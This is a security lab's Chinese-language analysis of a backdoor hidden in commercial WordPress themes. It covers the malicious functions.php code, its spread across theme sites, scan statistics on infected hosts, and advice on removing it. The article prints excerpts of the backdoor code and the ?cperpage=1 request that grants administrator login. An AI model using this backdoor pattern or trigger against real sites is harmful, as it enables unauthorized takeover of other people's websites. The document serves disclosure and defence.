**Author: p0wd3r，dawu，LG (知道创宇404安全实验室)**

**Date: 2016-11-15**

## 0x00 概述

上周公司小伙伴给了我一个Wordpress主题让我帮忙审核，漏洞没有发现，但是却发现了这样一个后门：

当启用这个主题后，攻击者即可通过该后门远程无需密码以管理员权限登录到网站的后台中。

这个后门可谓“年代久远”，早在2010年就在国外被提出来了（<http://harmonyinfotech.in/cms/wordpress-cms/wordpress-virus-function-_check_isactive_widgets/>），然而令人遗憾的是时间过了这么久依然还有很多主题存在这个后门，更令人惊讶的是一些提供主题下载的网站也存在该后门，如果被人加以利用后果不堪设想。

## 0x01 详细分析

我们的样本是从某网站花86块购买的（没错，付费主题也存在问题），正常审计过程中会搜索代码中使用的敏感函数，当搜索`call_user_func_array`函数的时候发现了两处奇怪的用法：

  1. `functions.php`第257行：

    
    
    $sq1="...". call_user_func_array($getcommentstext, array($s_text, $filter_h, $filters_types)) . "...";

这里省略了不必要的部分。可以看到作者将`call_user_func_array`的结果拼接到sql语句中，当时只是好奇为什么这样写，然而将这段代码放到搜索引擎中却发现了意外的结果：<http://ihacklog.com/post/wordpress-theme-malicious-code-analysis.html>，可以看到这正是里面所描述的恶意代码。根据文中的叙述，这段恶意代码的作用是：

> 启用后主题后每当有人访问网站就检查网站中的所有主题是否已被感染，然后感染未被感染的主题，随后将网站url发送到 livethemes@gmail.com
> 这个邮箱中

将文中的代码和本地的文件做一下对比（仅截取一部分）：

![Alt text](https://images.seebug.org/content/images/2016/12/diff-var.png-w331s)

发现只是在变量名上做了调整，然后在启用主题时进行动态调试，发现确实存在上文所说的向`livethemes@gmail.com`发送邮件的行为：

![Alt text](https://images.seebug.org/content/images/2016/12/mail.png-w331s)

现在我们可以确定这个主题是存在问题的，但仅仅是向`livethemes@gmail.com`发送我们网站url这么简单吗？

我们再来看下一处`call_user_func_array`调用：

  1. `functions.php`第306-310行：

    
    
    if ($use_link ) {
        if($forces_more) {
            $output .= "..." . $more_links_text = !is_user_logged_in() && @call_user_func_array($checkwidgets,array($perpage, true)) ? $more_links_text : "...";
        } else {
            $output .= "...";
        }
    }

当`$use_link`和`$forces_more`值为真时，调用`call_user_func_array($checkwidgets,array($perpage,
true))`，我们来看一下相关变量的值：

    
    
    if(!isset($method)) $method="cookie";
    if(!isset($filter_p)) $filter_p="wp_";
    if(!isset($use_link)) $use_link=1; 
    if(!isset($perpage)) $perpage=$_GET["cperpage"];
    if(!isset($authname)) $authname="auth";
    if(!isset($checkwidgets)) $checkwidgets=$filter_p."set"."_".$authname."_".$method;
    if(!isset($forces_more)) $forces_more=1;

可以看到`$use_link`和`$force_more`的值均为1，`$checkwidgets`值为`wp_set_auth_cookie`，所以这段函数可以精简为：`call_user_func_array('wp_set_auth_cookie',
array($_GET['cperpage'],
true)`。而`wp_set_auth_cookie`的作用是只需提供用户id即可实现登录（<https://developer.wordpress.org/reference/functions/wp_set_auth_cookie/>），我们实际操作一下：

未登录状态：

![Alt
text](https://images.seebug.org/content/images/2016/12/nologin.png-w331s)

访问`http://url/index.php?cperpage=1`：

![Alt
text](https://images.seebug.org/content/images/2016/12/adminlogin.png-w331s)

![Alt text](https://images.seebug.org/content/images/2016/12/wp-admin.png-w331s)

可以看到已经以管理员身份登录了，原来这里才是真正的后门所在。

总的来说该后门的功能如下：

  1. 启用后主题后每当有人访问网站就检查网站中的所有主题是否已被感染，然后感染未被感染的主题。
  2. 每当有人访问，检查是否曾向`livethemes@gmail.com`发送邮件，若没有将网站url发送到`livethemes@gmail.com`。
  3. 攻击者通过访问`http://url/index.php?cperpage=1`即可以管理员的身份登录使用被感染主题的网站。

## 0x02 影响 & 溯源

起初我们怀疑后门是由售卖主题的网站植入，但是我们发现该网站也是存在这个后门的：

![](https://images.seebug.org/content/images/2016/12/vuln-1-1.png-w331s)

不过有意思的是该网站的后门文件是上面所说的以前就被披露出的版本，和我们手中主题中的后门并不完全相同。

我们推断该网站售卖的主题是网站拥有者在其他主题的基础上更改的，而这些主题是被感染过的，但站长并没有对其进行检查。

随后我们又测试了另外一些售卖主题的网站，其中一个在百度搜索中排名十分靠前的网站也存在该后门：

![Alt text](https://images.seebug.org/content/images/2016/12/tt.png-w331s)

庆幸的是我们在这网站上下载的一些主题并不存在后门，但是这些高权重网站若被恶意利用后果将不堪设想。

**源头在哪里？**

通过[这篇文章](http://harmonyinfotech.in/cms/wordpress-cms/wordpress-virus-function-_check_isactive_widgets/)我们可以看到有人评论说 <http://www.themes2wp.com>
（需挂代理访问，国内访问会403）上的主题均存在该后门，我们下载了最新的主题（11月13日发布）发现确实如此，并且该网站本身并不存在后门。不过该网站上的主题存在的后门是上面所提到的以前的版本，和我们的样本在变量名上有一定差别。

通过一段时间的探索，我们发现该网站上的主题是从其他网站下载的，例如 <https://flexithemes.com>，我们可以在其源码中搜索到相关内容：

![Alt text](https://images.seebug.org/content/images/2016/12/source.png-w331s)

但是我们对比从两个网站下载的相同的主题：

![Alt text](https://images.seebug.org/content/images/2016/12/diff.png-w331s)

![Alt text](https://images.seebug.org/content/images/2016/12/diff-file.png-w331s)

![Alt
text](https://images.seebug.org/content/images/2016/12/outlink.png-w331s)

可以看到后者在前者的基础上在`functions.php`中添加了恶意代码，并在`siderbar.php`中添加了外链，外链域名与这个网站域名是同一个组织注册的：

![Alt
text](https://images.seebug.org/content/images/2016/12/whoisinfo.png-w331s)

所以总的来说 <http://www.themes2wp.com>
有很大的嫌疑是传播的源头，它首先从其他一些免费主题下载站下载主题，然后向其中注入恶意代码并重新打包再提供给用户下载，并且可能有另一批人对后门进行了更改后再进行传播。[www.themes2wp.com](http://www.themes2wp.com)
于2009年注册，如果它真的是传播源头，仅从时间跨度上来看影响也是很大的。

## 0x03 受感染主机数据分析

我们根据该后门的特征，对ZoomEye中记录的400多万域名进行了扫描，发现近8000台主机受到了感染。对于这些受感染的主机，我们做了如下统计。

#### 国家分布统计

![](https://images.seebug.org/content/images/2016/12/8856D196-8452-47F2-96B1-B3E8D91B7A1D.png-w331s)

#### IP统计

![](https://images.seebug.org/content/images/2016/12/C2B2185A-00CD-4942-9AF1-D96C2BE2F668.png-w331s)

经检测，受到感染的近8000个域名中只对应了3000多个IP，我们统计了IP绑定域名的情况。这些IP中大约有百分之二十以上的IP绑定了多个域名。可能一个域名被感染后，导致同一个IP下的域名都被感染。

#### 网站title统计

![](https://images.seebug.org/content/images/2016/12/CEDEFD7C-1E3A-48E1-8BFF-DCCB1CF6F090.png-w331s)

通过对重复title的统计可以看出，除了HTTP状态页面301页面以外，剩下重复的title数量极少。我们可以做出的判断是，这个后门影响着各个行业的网站，而不是针对某个特定的行业。

![](https://images.seebug.org/content/images/2016/12/55A677FD-9E04-4FCB-98AD-3094645BF91E.png-w331s)

通过对网站title词频统计分析，可以看到娱乐城（黑色部分）有关的约占了四分之一。 为了了解国内的影响情况，我们统计了国内外title的词频，结果如下:

![](https://images.seebug.org/content/images/2016/12/4DC8D7BD-930E-4097-AB5A-1A3B633DE984.png-w331s)

通过上图的统计，在国内的title中我们没有发现黑产的踪迹。

![](https://images.seebug.org/content/images/2016/12/D8EB8064-5C71-4D74-88C3-CE2BE8C09241.png-w331s)

国外title中我们找到了更多的黑产的关键词。

根据以上词频统计的结果，一共937个网站首页包含娱乐这个关键词，其中位于美国的网站就有720个。在8000个存在后门的网站中,中文网站大约占了二分之一，其中就有近千网站与黑产有关。

#### 后门利用流程

![](https://images.seebug.org/content/images/2016/12/B30A4428-D3CA-466E-A87C-A29FBAACC5C8.png-w331s)

## 0x04 检测 & 修复

检测：

可以使用 **[Seebug 照妖镜](https://www.seebug.org/monster/?vul_id=92572)** 进行在线检测。

修复：

  * 删除网站目录下 **所有** 主题的`funcions.php`中的恶意代码
  * 通过日志检查攻击者在获取管理员权限后又进行了哪些敏感操作

## 0x05 参考

<https://developer.wordpress.org/reference/functions/wp_set_auth_cookie/>

<http://ihacklog.com/post/wordpress-theme-malicious-code-analysis.html>

<http://harmonyinfotech.in/cms/wordpress-cms/wordpress-virus-function-_check_isactive_widgets/>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/140/>

